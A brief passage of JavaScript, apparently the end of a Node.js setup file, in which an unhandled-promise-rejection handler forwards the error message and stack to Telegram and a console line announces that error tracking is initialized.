    sendErrorToTelegram(`Unhandled Rejection: ${message}`, stack);
});

console.log('✅ Error tracking system initialized');